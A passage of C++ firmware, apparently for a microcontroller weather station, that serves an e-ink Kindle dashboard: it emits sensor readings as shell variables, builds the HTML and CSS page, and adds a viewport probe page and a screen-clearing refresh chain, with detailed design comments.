    fmtTemp(buf, sizeof(buf), outT.value, skin.tempDecimals);
    kdShellVar(s, "OUT_TEMP", outT.ok ? buf : "--");
    s->printf("OUT_HUM=%d\n", outH.ok ? (int)roundf(outH.value) : -1);
    
    if (outP.ok) {
        const float pv = kdPressureValue(outP.value, skin.pressureUnit);
        const int pd = kdPressureDecimals(skin.pressureUnit);
        if (pd) snprintf(buf, sizeof(buf), "%.*f", pd, (double)pv);
        else    fmtInt(buf, sizeof(buf), pv);
        kdShellVar(s, "OUT_PRES", buf);
        kdShellVar(s, "OUT_PRES_UNIT", kdPressureUnitLabel(skin.pressureUnit));
    } else {
        s->print("OUT_PRES=\"--\"\nOUT_PRES_UNIT=\"\"\n");
    }

    if (haveP) {
        const Tendency t = pressureTendency(tPress);
        if (t.have) {
            kdShellVar(s, "OUT_TEND", t.word);
            const char* arrows[] = {"↑", "↗", "→", "↘", "↓"};
            int ai = 2; // steady default
            if (t.delta >= 1.6f) ai = 0;
            else if (t.delta >= 0.5f) ai = 1;
            else if (t.delta > -0.5f) ai = 2;
            else if (t.delta > -1.6f) ai = 3;
            else ai = 4;
            kdShellVar(s, "OUT_TEND_ARROW", arrows[ai]);
            const float dv = kdPressureValue(t.delta, skin.pressureUnit);
            const int ddec = kdPressureDecimals(skin.pressureUnit) + 1;
            s->printf("OUT_TEND_DELTA=\"%+.*f\"\n", ddec, (double)dv);
        } else {
            s->print("OUT_TEND=\"\"\nOUT_TEND_ARROW=\"\"\nOUT_TEND_DELTA=\"\"\n");
        }
    } else {
        s->print("OUT_TEND=\"\"\nOUT_TEND_ARROW=\"\"\nOUT_TEND_DELTA=\"\"\n");
    }

    float mn = 1e9f, mx = -1e9f;
    if (haveOut) {
        for (int i = 0; i < TrendRing::HOURS; i++) {
            if (tOut[i].count) {
                if (tOut[i].min < mn) mn = tOut[i].min;
                if (tOut[i].max > mx) mx = tOut[i].max;
            }
        }
    }
    if (mn <= mx) {
        fmtTemp(buf, sizeof(buf), mn, skin.tempDecimals);
        kdShellVar(s, "OUT_RANGE_LO", buf);
        fmtTemp(buf, sizeof(buf), mx, skin.tempDecimals);
        kdShellVar(s, "OUT_RANGE_HI", buf);
    } else {
        s->print("OUT_RANGE_LO=\"\"\nOUT_RANGE_HI=\"\"\n");
    }

    if (outT.ok && outT.ts && now > outT.ts) {
        s->printf("OUT_AGE_MIN=%u\n", (unsigned)((now - outT.ts) / 60));
    } else {
        s->print("OUT_AGE_MIN=0\n");
    }

    bool battWarn = false;
    #ifdef FEATURE_ESPNOW_INGEST
    battWarn = espnowAnyBatteryWarn();
    #endif
    s->printf("OUT_BATT_WARN=%d\n", battWarn ? 1 : 0);

    // ── Indoor ──
    fmtTemp(buf, sizeof(buf), inT.value, skin.tempDecimals);
    kdShellVar(s, "IN_TEMP", inT.ok ? buf : "--");
    s->printf("IN_HUM=%d\n", inH.ok ? (int)roundf(inH.value) : -1);
    if (inA.ok) s->printf("IN_AQI=%d\n", (int)roundf(inA.value));
    else s->print("IN_AQI=\n");
    if (inT.ok && inT.ts && now > inT.ts)
        s->printf("IN_AGE_MIN=%u\n", (unsigned)((now - inT.ts) / 60));
    else
        s->print("IN_AGE_MIN=0\n");

    // ── Clock & Date ──
    if (now > 1000000000u) {
        struct tm tm;
        time_t t = (time_t)now;
        localtime_r(&t, &tm);
        s->printf("CLOCK=\"%02d:%02d\"\n", tm.tm_hour, tm.tm_min);
        {
            char dbuf[32];
            snprintf(dbuf, sizeof(dbuf), "%d %s", tm.tm_mday, kdMonth(tm.tm_mon));
            kdShellVar(s, "DATE", dbuf);
        }
        kdShellVar(s, "MONTH_LABEL", kdMonth(tm.tm_mon));
        s->printf("YEAR=%d\n", tm.tm_year + 1900);

        int wday = (tm.tm_wday + 6) % 7; // 0=Mon..6=Sun
        time_t monday = t - wday * 86400;
        for (int i = 0; i < 7; i++) {
            time_t day = monday + i * 86400;
            struct tm dtm;
            localtime_r(&day, &dtm);
            kdShellVarN(s, "WK%d_NAME", i, kdWeekdayShort(i));
            s->printf("WK%d_DAY=%d\n", i, dtm.tm_mday);
        }
        s->printf("WK_TODAY=%d\n", wday);
    } else {
        s->print("CLOCK=\"--:--\"\nDATE=\"\"\nMONTH_LABEL=\"\"\nYEAR=\n");
        for (int i = 0; i < 7; i++)
        {
            kdShellVarN(s, "WK%d_NAME", i, kdWeekdayShort(i));
            s->printf("WK%d_DAY=\n", i);
        }
        s->print("WK_TODAY=-1\n");
    }

    // ── Forecast ──
    #ifdef MODULE_FORECAST_ENABLED
    const auto& fc = forecastModule.snapshot();
    kdShellVar(s, "FC_SUMMARY", fc.summary);
    s->printf("FC_CODE=%d\n", fc.code);
    s->printf("FC_HIGH=%d\n", (int)roundf(fc.highC));
    s->printf("FC_LOW=%d\n", (int)roundf(fc.lowC));
    s->printf("FC_WIND=%d\n", (int)roundf(fc.windKph));
    for (int i = 0; i < 3; i++) {
        kdShellVarN(s, "FC%d_LABEL", i, fc.outlook[i].label);
        s->printf("FC%d_CODE=%d\n", i, fc.outlook[i].code);
        s->printf("FC%d_TEMP=%d\n", i, (int)roundf(fc.outlook[i].tempC));
        if (!isnan(fc.outlook[i].lowC))
            s->printf("FC%d_LOW=%d\n", i, (int)roundf(fc.outlook[i].lowC));
        else
            s->printf("FC%d_LOW=\n", i);
    }
    #else
    s->print("FC_SUMMARY=\"\"\nFC_CODE=-1\nFC_HIGH=\nFC_LOW=\nFC_WIND=\n");
    for (int i = 0; i < 3; i++)
        s->printf("FC%d_LABEL=\"\"\nFC%d_CODE=-1\nFC%d_TEMP=\nFC%d_LOW=\n", i, i, i, i);
    #endif

    // ── UI labels ──
    kdShellVar(s, "LBL_OUTSIDE", KD_T("OUTSIDE", "НАВЪН"));
    kdShellVar(s, "LBL_INSIDE", KD_T("INSIDE", "ВЪТРЕ"));
    kdShellVar(s, "LBL_LAST24", KD_T("LAST 24 HOURS", "ПОСЛЕДНИТЕ 24 ЧАСА"));
    kdShellVar(s, "LBL_FORECAST", KD_T("FORECAST", "ПРОГНОЗА"));
    kdShellVar(s, "LBL_MEASURED", KD_T("Measured on site", "Измерено на място"));
    kdShellVar(s, "LBL_NO_READING", KD_T("no reading", "няма данни"));
    kdShellVar(s, "LBL_WIND", KD_T("wind", "вятър"));
    kdShellVar(s, "LBL_TO", KD_T("to", "до"));

    // ── Slots ──
    //
    // The configurable layout, emitted alongside the fixed OUT_*/IN_* keys
    // rather than instead of them. A Kindle running an older copy of
    // update_dash.sh keeps working from the keys it knows; a current one draws
    // the slot flow and ignores them. Nobody has to update the reader and the
    // collector in the same minute.
    //
    // Each slot arrives already placed — row and column in twelfths — because
    // the packing has to agree with the HTML page's, and two implementations of
    // one packing rule is two chances to disagree about where a value goes.
    emitSlots(s, skin, now);

    // ── Metadata ──
    const uint16_t resW = skin.fbinkResW ? skin.fbinkResW : (uint16_t)KINDLE_PAGE_W;
    const uint16_t resH = (resW > 600) ? 1448 : 800;
    s->printf("RES_W=%u\n", resW);
    s->printf("RES_H=%u\n", resH);
    kdShellVar(s, "LANG", KD_T("en", "bg"));
    s->printf("DECIMALS=%d\n", skin.tempDecimals);
    s->printf("CLOCK_STYLE=%d\n", skin.clockStyle);
    s->printf("SHOW_FLAGS=%u\n", skin.showFlags);

    req->send(s);
}

static void handleKindle(AsyncWebServerRequest* req) {
    const Latest outT = latestOf(outdoorSensorId(), "temperature");
    const Latest outH = humidityOf(outdoorSensorId());
    const Latest outP = latestOf(outdoorSensorId(), "pressure");
    const Latest inT  = latestOf(indoorSensorId(),  "temperature");
    const Latest inH  = humidityOf(indoorSensorId());

    const uint32_t now = (uint32_t)time(nullptr);

    TrendRing::Hour tOut[TrendRing::HOURS];
    TrendRing::Hour tIn [TrendRing::HOURS];
    TrendRing::Hour tPress[TrendRing::HOURS];
    const bool haveOut = trendRing.series(outdoorSensorId(), "temperature", now, tOut);
    const bool haveIn  = trendRing.series(indoorSensorId(),  "temperature", now, tIn);
    const bool haveP   = trendRing.series(outdoorSensorId(), "pressure",    now, tPress);

    // A clamped COPY, not a reference into the live config. The page reads
    // this a dozen times while it builds; taking the values once means a save
    // landing mid-render cannot produce a page whose stylesheet and markup
    // disagree about which clock is being drawn.
    KindleConfig skin = config.kindle;
    kdSkinClamp(skin);

    String p;
    p.reserve(7000);
    char buf[16];

    p += F("<!DOCTYPE html><html><head><meta charset=\"UTF-8\">"
           "<meta name=\"viewport\" content=\"width=");
    p += PAGE_W;
    p += F("\"><meta http-equiv=\"refresh\" content=\"");
    // Newest of the two sensors: the page is current if either one is, and
    // waiting on the slower of the pair would show a stale outdoor reading.
    // The clock only makes its once-a-minute demand when it is actually drawn
    // — an unsynced device prints "clock not set" and has nothing to keep
    // fresh, so it must be allowed to back off like any other stale source.
    // The stored cadence, with the compile-time knobs as the defaults. 0 and
    // 0xFF are the "not configured" sentinels — see KindleConfig — so a device
    // that has never opened the settings form behaves exactly as it did before
    // the fields existed.
    KdCadence cad;
    if (skin.refreshSec)             cad.refreshSec      = skin.refreshSec;
    if (skin.followData != 0xFF)     cad.followData      = (skin.followData != 0);
    if (skin.clockPinRefresh != 0xFF) cad.clockPinRefresh = (skin.clockPinRefresh != 0);
    cad.clamp();

    p += kdRefreshDelaySec(outT.ts > inT.ts ? outT.ts : inT.ts, now,
                           now > KINDLE_MIN_REAL_TS, cad);
    p += F("\"><title>" KD_T("Weather", "Времето") "</title><style>");

    // The stylesheet, emitted rather than stored as one literal: every number
    // in it is a 600-px-layout figure passed through kdPx(). KD_S is a literal
    // fragment, KD_N a scaled number — reading a line as "fragment, number,
    // fragment" is how to check one against the design it came from.
    #define KD_S(lit) p += F(lit)
    #define KD_N(n)   p += kdPx(n)

    KD_S("body{font-family:Bookerly,Caecilia,Georgia,'Times New Roman',serif;"
         "margin:0;padding:");                 KD_N(20);
    KD_S("px ");                               KD_N(18);
    KD_S("px;background:#fff;color:#000;-webkit-text-size-adjust:none}"
         "*{box-sizing:border-box}"
         "table{width:100%;border-collapse:collapse}"
         "td{vertical-align:top;padding:0}");

    // Palette: #000 #444 #777 #aaa #d8d8d8 #fff. The panel has 16 real grey
    // levels — the dithering that argued against greys here comes from
    // gradients and from tones too close together, not from flat
    // well-separated fills. Spaced this far apart each renders solid.
    KD_S(".hero td{padding:");                 KD_N(2);
    KD_S("px 0 ");                             KD_N(6);
    KD_S("px}");

    // Two classes, not one: .hero td above is (0,1,1) and would otherwise
    // outrank a bare .sep (0,1,0), zeroing this padding and letting the rule
    // sit against the first glyph of the inside reading.
    KD_S(".hero .sep{border-left:");           KD_N(1);
    KD_S("px solid #aaa;padding-left:");       KD_N(30);
    KD_S("px}");

    // The badge sits on the label's own line, pushed right. float and not
    // flex: this page is built for a browser that may be WebKit 531, where
    // flexbox does not exist. A float has worked since 1996.
    KD_S(".bw{float:right;margin-top:"); KD_N(-2);
    KD_S("px}");

    KD_S(".lab{font-size:");                   KD_N(12);
    KD_S("px;letter-spacing:");                KD_N(4);
    KD_S("px;text-transform:uppercase;margin-bottom:"); KD_N(2);
    KD_S("px;color:#777}");

    // Fixed height, not line-height alone: the two columns use different
    // sizes, and without it the text under the smaller numeral starts higher
    // and the column rule looks ragged.

    // Four glyphs ("21.0", "-8.4") overrun the column at the larger size.


    KD_S(".sub{font-size:");                   KD_N(15);
    KD_S("px;margin-top:");                    KD_N(6);
    KD_S("px;line-height:1.45;color:#444}");
    KD_S(".dim{color:#777}");

    // Temperature and humidity are one reading of one parcel of air, so they
    // share a baseline and a slash rather than a line break.

    // A six-glyph reading ("-12.4") already drops to .big4; the pair beside it
    // has to come down too or "100%" runs off the column.

    // The absolute pressure is the one figure here compared against memory
    // rather than against the page; at 15px it was set as a footnote to the
    // humidity.

    // Right column. THE FIXED HEIGHT IS GONE, and the comment that used to
    // justify it with it: it existed to keep a divider level with the inside
    // block that sat underneath, and both of those are slots now, rendered
    // below this table rather than inside it. What was alignment became 35 px
    // of empty cell, on a page whose whole budget is one 800 px screen with no
    // scrollbar to reveal what falls off the end.
    KD_S(".clock{font-size:");                 KD_N(96);
    KD_S("px;line-height:");                   KD_N(100);
    KD_S("px;letter-spacing:");                KD_N(-4);
    KD_S("px}");
    KD_S(".clock-x{font-size:");               KD_N(44);
    KD_S("px;line-height:");                   KD_N(100);
    KD_S("px;color:#777;letter-spacing:0}");


    // ── The slot flow ────────────────────────────────────────────────────────
    // Four type sizes, which are the four the page already used: the hero is
    // the old .big, and the rest step down through what the outdoor pressure
    // and the inside line were set at. The reader is choosing WHICH reading
    // goes where, not inventing a new type scale — these were measured on the
    // panel and are not the reader's to get wrong.
    //
    // table-layout:fixed so the width attribute on each cell is obeyed. Without
    // it the browser sizes columns by content, and a four-digit pressure beside
    // a two-digit humidity would take the space the twelfths already allocated.
    KD_S(".slots{width:100%;border-collapse:collapse;table-layout:fixed}");
    KD_S(".slot{vertical-align:top;padding:0 ");  KD_N(6);
    KD_S("px 0 0}");
    KD_S(".slot .lab{margin-bottom:0}");
    KD_S(".slot .val{line-height:0.98;letter-spacing:-");  KD_N(1);
    KD_S("px;white-space:nowrap;overflow:hidden}");
    KD_S(".slot .val-b{font-weight:700}");
    KD_S(".slot .unit{font-size:0.42em;font-weight:400;color:#444}");
    // The age rides on the value's baseline rather than taking a line of its
    // own. Six slots each spending a line on "3 min old" cost more of the
    // panel than the chart did, and the page has to fit 800 px without a
    // scrollbar the reader cannot see.
    KD_S(".slot .age{font-size:");                KD_N(13);
    KD_S("px;font-weight:400;letter-spacing:0;color:#777;vertical-align:baseline}");
    KD_S(".sl-h .val{font-size:");                KD_N(92);
    KD_S("px}");
    KD_S(".sl-l .val{font-size:");                KD_N(44);
    KD_S("px}");
    KD_S(".sl-m .val{font-size:");                KD_N(34);
    KD_S("px}");
    KD_S(".sl-s .val{font-size:");                KD_N(26);
    KD_S("px}");

    // Three rules on the page, so a few px each is what keeps the footer above
    // the fold. Measured, not guessed.
    KD_S(".rule{border-top:");                 KD_N(1);
    KD_S("px solid #aaa;margin:");             KD_N(10);
    KD_S("px 0 ");                             KD_N(7);
    KD_S("px}");
    KD_S(".sec{font-size:");                   KD_N(12);
    KD_S("px;letter-spacing:");                KD_N(4);
    KD_S("px;text-transform:uppercase;margin-bottom:"); KD_N(8);
    KD_S("px;color:#777}");

    KD_S(".ico{vertical-align:top;padding-top:"); KD_N(4);
    KD_S("px}");
    KD_S(".fc{font-size:");                    KD_N(28);
    KD_S("px;line-height:1.1;padding-left:");  KD_N(12);
    KD_S("px}");
    KD_S(".fc-t{font-size:");                  KD_N(30);
    KD_S("px;margin-top:");                    KD_N(1);
    KD_S("px;color:#000}");

    // Equal thirds of the right half; nowrap so a two-part daily figure never
    // breaks across lines.
    KD_S(".per{width:");                       KD_N(88);
    KD_S("px;text-align:center;vertical-align:top;white-space:nowrap;"
         "background:#f0f0f0;border-left:");   KD_N(4);
    KD_S("px solid #fff}");
    KD_S(".per-l{font-size:");                 KD_N(11);
    KD_S("px;letter-spacing:");                KD_N(2);
    KD_S("px;text-transform:uppercase;margin-bottom:"); KD_N(1);
    KD_S("px;color:#777;padding-top:");        KD_N(4);
    KD_S("px}");
    KD_S(".per-t{font-size:");                 KD_N(19);
    KD_S("px;margin-top:");                    KD_N(-2);
    KD_S("px;padding-bottom:");                KD_N(5);
    KD_S("px}");

    KD_S(".chart{display:block;margin:");      KD_N(2);
    KD_S("px auto 0}");
    KD_S(".grid{stroke:#c4c4c4;stroke-width:"); KD_N(1);
    KD_S("}.vgrid{stroke:#d5d5d5;stroke-width:"); KD_N(1);
    KD_S("}.base{stroke:#777;stroke-width:");  KD_N(1);
    KD_S("}.ax{font-size:");                   KD_N(11);
    KD_S("px;fill:#777;font-family:Bookerly,Georgia,serif}");
    KD_S(".band{fill:#d8d8d8;stroke:#8f8f8f;stroke-width:"); KD_N(1);
    KD_S("}.l-out{fill:none;stroke:#000;stroke-width:"); KD_N(3);
    KD_S("}.l-in{fill:none;stroke:#777;stroke-width:"); KD_N(2);
    KD_S(";stroke-dasharray:");                KD_N(7);
    KD_S(" ");                                 KD_N(5);
    KD_S("}");

    KD_S(".key{font-size:");                   KD_N(13);
    KD_S("px;margin-top:");                    KD_N(2);
    KD_S("px;color:#444}");
    KD_S(".key td{padding-top:");              KD_N(2);
    KD_S("px}");
    KD_S(".note{font-size:");                  KD_N(15);
    KD_S("px;font-style:italic;text-align:center;padding:"); KD_N(36);
    KD_S("px 0;color:#777}");

    // Tighter under its heading than the two sections above: the strip is a
    // row of blocks, not a paragraph, and the extra gap was what pushed the
    // footer below the fold.
    KD_S(".sec-wk{margin-bottom:");            KD_N(3);
    KD_S("px}");
    KD_S(".wk{margin-top:");                   KD_N(2);
    KD_S("px}");
    KD_S(".wd{width:14.28%;text-align:center;padding:"); KD_N(8);
    KD_S("px 0 ");                             KD_N(7);
    KD_S("px;background:#f4f4f4}");
    KD_S(".wd-we{background:#e4e4e4}");
    KD_S(".wd-n{font-size:");                  KD_N(11);
    KD_S("px;letter-spacing:");                KD_N(2);
    KD_S("px;text-transform:uppercase;color:#777}");
    KD_S(".wd-d{font-size:");                  KD_N(24);
    KD_S("px;line-height:1.15}");

    // Inverted rather than outlined: a filled block is the one mark that stays
    // unambiguous after e-ink dithering, where a thin ring can read as a smudge.
    KD_S(".wd-now{background:#000;color:#fff}");

    KD_S(".foot{border-top:");                 KD_N(1);
    KD_S("px solid #aaa;margin-top:");         KD_N(7);
    KD_S("px;font-size:");                     KD_N(12);
    KD_S("px;color:#555;letter-spacing:.5px}");
    KD_S(".foot td{padding-top:");             KD_N(5);
    KD_S("px}");

    // Boxed rather than underlined so the target is visible before it is
    // touched, which on a panel with no hover state is the only chance.
    //
    // SIZE, HONESTLY: this comes to 72x26 CSS px, which is about 11x4 mm on
    // any of the readers this page targets — a 300 ppi Paperwhite scaling 600
    // CSS px across 1072 device px and a 167 ppi Kindle 7 mapping them 1:1
    // work out to the same 0.15 mm per CSS px. An earlier version of this
    // comment cited "44 device px" as the guideline met; that was wrong twice
    // over. The 44 in the usual guidance is CSS px on a phone, roughly 9 mm,
    // and 4 mm is under half of it. It is reachable with an infrared touch
    // panel but it is not generous, and the page has no spare height at 796 of
    // 800 to grow it without taking the difference from the chart.
    KD_S(".act{text-align:right;white-space:nowrap}");
    KD_S(".act a{display:inline-block;border:");  KD_N(1);
    KD_S("px solid #777;color:#000;text-decoration:none;padding:"); KD_N(4);
    KD_S("px ");                                  KD_N(12);
    KD_S("px;margin-left:");                      KD_N(8);
    KD_S("px;font-size:");                        KD_N(13);
    KD_S("px;letter-spacing:");                   KD_N(1);
    KD_S("px;background:#f4f4f4}");

    #undef KD_S
    #undef KD_N

    // Everything above is the design and is emitted unconditionally; anything
    // the reader has chosen goes here, as overrides. See KindleSkin.h for why
    // the two are kept apart — briefly: the preview tool reconstructs the
    // sheet above by reading this source, and a branch in it would put every
    // arm of every choice into the picture at once.
    kdSkinCss(p, skin);

    p += F("</style></head><body>");

    // No masthead. The place name never changed and the date is carried by the
    // week strip at the foot, so the row was two lines of furniture above the
    // only two numbers the page exists to show. The hero row is the masthead.

    // THE SAME SLOT FLOW THE FBINK RENDERER DRAWS.
    //
    // This page used to hardwire the six readings, which is what the slot list
    // replaced everywhere else — and leaving it behind would have been worse
    // than never converting it: two renderers of one dashboard, disagreeing
    // about what the reader configured, with only one of them obeying the
    // settings page.
    //
    // The packing is not repeated here. appendSlots() is handed the same
    // placements the data endpoint sends the Kindle, from the same call, so
    // "where does this value go" has one answer on this device.
    //
    // A TABLE, not a grid or flexbox. The reader is a browser from 2014 with no
    // CSS Grid and a flexbox implementation that is not worth finding the edges
    // of; the rest of this page is tables for the same reason.
    p += F("<table class=\"hero\"><tr><td width=\"50%\">");

    // Row 0 of the flow, beside the clock.
    appendSlotRows(p, skin, now, 0, 0);

    p += F("</td><td width=\"50%\" class=\"sep\">");
    p += F("</td></tr></table>");

    // Rows 1 and after, at the full width the clock does not share.
    appendSlotRows(p, skin, now, 1, 0xFF);

    if (skin.showFlags & KSHOW_CHART) {
        p += F("<div class=\"rule\"></div><div class=\"sec\">"
               KD_T("Last 24 hours", "Последните 24 часа") "</div>");
        appendChart(p, tOut, tIn, haveOut, haveIn);
        if (haveOut || haveIn) {
            // The two swatches must be drawn with the same stroke as the lines
            // they stand for — .l-out #000/3, .l-in #777/2 dashed — or the key
            // describes a chart the reader is not looking at.
            p += F("<table class=\"key\"><tr><td>");
            appendKeySwatch(p, "#000", 3, false);
            p += F(" " KD_T("outside mean", "средно навън")
                   "<span class=\"dim\">"
                   KD_T(", shaded band = hourly low to high",
                        ", сивото е час. мин&ndash;макс")
                   "</span>"
                   "</td><td style=\"text-align:right\">");
            appendKeySwatch(p, "#777", 2, true);
            p += F(" " KD_T("inside", "вътре") "</td></tr></table>");
        }
    }

#ifdef MODULE_FORECAST_ENABLED
    // Last, deliberately: the measured values are what the reader came for and
    // the forecast is the supporting note, so it reads as a footnote rather
    // than as something competing with the two temperatures.
    appendForecastSection(p);
#endif

    if (skin.showFlags & KSHOW_WEEK) appendWeek(p, now);

    // The footer carries the two manual repaints. Links rather than anything
    // scripted, so a five-way pad reaches them as readily as a fingertip. See
    // the .act rule for what the padding actually buys, and for why the size
    // is smaller than the usual touch guidance rather than meeting it.
    p += F("<table class=\"foot\"><tr><td>"
           KD_T("Measured on site", "Измерено на място"));
    p += F("</td><td class=\"act\"><a href=\"/kindle\">"
           KD_T("refresh", "обнови") "</a>"
           "<a href=\"/kindle/clear\">" KD_T("clear", "изчисти") "</a>"
           "</td></tr></table></body></html>");

    AsyncWebServerResponse* res = req->beginResponse(200, "text/html", p);
    // The meta tag drives the refresh, so nothing may be served from cache: an
    // e-ink browser holding a stale page is indistinguishable from a dead
    // sensor, and there is no spinner to give the game away.
    res->addHeader("Cache-Control", "no-store");
    req->send(res);
}

void kindleTrackTrends() {
    trendRing.track(outdoorSensorId(), "temperature");
    trendRing.track(indoorSensorId(),  "temperature");
    trendRing.track(outdoorSensorId(), "pressure");
    trendRing.track(outdoorSensorId(), "humidity");
}

// ---------------------------------------------------------------------------
// GET /kindle/probe — what to set KINDLE_PAGE_W to
// ---------------------------------------------------------------------------
// The right layout width depends on what the reader's browser reports for its
// viewport and devicePixelRatio, and that is a question only the device can
// answer. Rather than guess, load this on the reader and read the numbers off.
//
// This is the one page here that uses JavaScript, because the numbers it exists
// to print are only knowable from inside the browser. It degrades: the user
// agent comes from the request header and is printed server-side, so an older
// firmware that runs nothing still tells you which browser it is.
//
// The ruler underneath needs no script at all. Each bar is a fixed pixel width
// declared under a viewport pinned to the width it is testing, so whichever bar
// reaches the right edge names the value to build with.
static void handleKindleProbe(AsyncWebServerRequest* req) {
    String p;
    p.reserve(2600);

    p += F("<!DOCTYPE html><html><head><meta charset=\"UTF-8\">"
           "<meta name=\"viewport\" content=\"width=");
    p += PAGE_W;
    p += F("\"><title>Kindle probe</title><style>"
           "body{font-family:Bookerly,Georgia,serif;margin:0;padding:16px;"
           "background:#fff;color:#000;-webkit-text-size-adjust:none}"
           "h1{font-size:20px;margin:0 0 10px}"
           "p,li{font-size:15px;line-height:1.5}"
           "b{font-size:19px}"
           ".bar{background:#d8d8d8;border-left:2px solid #000;margin-bottom:3px;"
           "font-size:12px;padding:2px 4px;white-space:nowrap}"
           "</style></head><body><h1>Layout probe</h1>");

    p += F("<p>This build is <b>KINDLE_PAGE_W=");
    p += PAGE_W;
    p += F("</b>.</p><p id=\"r\">If this line does not change, this browser "
           "runs no JavaScript &mdash; use the ruler below instead.</p>"
           "<script>document.getElementById('r').innerHTML="
           "'innerWidth <b>'+window.innerWidth+'</b> &middot; innerHeight <b>'"
           "+window.innerHeight+'</b><br>devicePixelRatio <b>'"
           "+(window.devicePixelRatio||1)+'</b> &middot; screen '"
           "+screen.width+'&times;'+screen.height;</script>");

    // Server-side, so it survives a browser that will not run the script.
    p += F("<p>User agent:<br>");
    if (req->hasHeader("User-Agent")) {
        String ua = req->header("User-Agent");
        ua.replace("<", "&lt;");
        p += ua;
    } else {
        p += F("(not sent)");
    }
    p += F("</p>");

    // 320 is below anything this layout supports and 1072 is the panel's own
    // pixel count; a bar that overflows tells you as much as one that fits.
    p += F("<p>The first bar that reaches the right edge without overflowing is "
           "the width to build with:</p>");
    static const int CANDIDATES[] = { 1072, 800, 768, 700, 600, 536, 480, 400 };
    for (unsigned i = 0; i < sizeof(CANDIDATES) / sizeof(CANDIDATES[0]); i++) {
        p += F("<div class=\"bar\" style=\"width:");
        p += CANDIDATES[i];
        p += F("px\">");
        p += CANDIDATES[i];
        p += F("</div>");
    }

    p += F("<p><a href=\"/kindle\">back to the dashboard</a></p></body></html>");

    AsyncWebServerResponse* res = req->beginResponse(200, "text/html", p);
    res->addHeader("Cache-Control", "no-store");
    req->send(res);
}

// ---------------------------------------------------------------------------
// GET /kindle/clear — drive the panel to both extremes, then come back
// ---------------------------------------------------------------------------
// E-ink keeps a ghost of what it drew before. A page of mostly-white text and
// hairlines never asks the controller for a full waveform, so the ghost of a
// heavier layout can sit under it for hours. What clears it is driving every
// pixel to black and to white a few times, which is what the reader's own
// "refresh" does and what no ordinary page can ask for.
//
// So this is a chain of full-screen frames, alternating, each meta-refreshing
// to the next and the last one back to the dashboard. Four frames: fewer
// leaves a faint ghost of the heaviest block, more is time spent staring at a
// flashing screen for no further gain.
//
// The step is clamped rather than trusted. It arrives in a query string, so it
// is reader-supplied, and an unbounded value would let a stray link build a
// chain that never returns to the dashboard.
static void handleKindleClear(AsyncWebServerRequest* req) {
    static const int FRAMES = 4;

    int step = 1;
    if (req->hasParam("s")) {
        step = req->getParam("s")->value().toInt();
        if (step < 1)       step = 1;
        if (step > FRAMES)  step = FRAMES;
    }

    const bool black = (step % 2) == 1;

    String p;
    p.reserve(500);
    p += F("<!DOCTYPE html><html><head><meta charset=\"UTF-8\">"
           "<meta name=\"viewport\" content=\"width=");
    p += PAGE_W;
    p += F("\"><meta http-equiv=\"refresh\" content=\"1;url=/kindle");
    if (step < FRAMES) { p += F("/clear?s="); p += (step + 1); }
    p += F("\"><title>...</title><style>html,body{margin:0;padding:0;height:100%;"
           "background:");
    p += black ? F("#000") : F("#fff");
    p += F("}</style></head><body></body></html>");

    AsyncWebServerResponse* res = req->beginResponse(200, "text/html", p);
    res->addHeader("Cache-Control", "no-store");
    req->send(res);
}

// ORDER IS LOAD-BEARING. AsyncCallbackWebHandler::canHandle matches when the
// request URL equals its uri OR starts with uri + "/", and _attachHandler
// takes the first handler that matches, in registration order. So "/kindle"
// registered first swallows "/kindle/probe" and "/kindle/clear": both were
// silently unreachable, and the pages simply rendered the dashboard instead.
// The children go first.
void registerKindleDashboard(AsyncWebServer& server) {
    // Loaded here rather than in setup(): registration is the first moment the
    // dashboard exists as a thing, the filesystem is up by now, and it keeps
    // the sketch from needing to know that slots are a file at all.
    //
    // The two sensor ids seed the defaults, so a device that has never
    // configured a slot gets the page it had before slots existed — built from
    // whichever sensors it was already pointing at.
    if (activeFS) kdSlotsBegin(*activeFS, outdoorSensorId(), indoorSensorId());

    server.on("/kindle/probe", HTTP_GET, handleKindleProbe);
    server.on("/kindle/clear", HTTP_GET, handleKindleClear);
    server.on("/kindle/data",  HTTP_GET, handleKindleData);
    server.on("/kindle/graph.bmp", HTTP_GET, handleKindleGraph);
    server.on("/kindle",       HTTP_GET, handleKindle);
}

#endif  // FEATURE_KINDLE_DASHBOARD
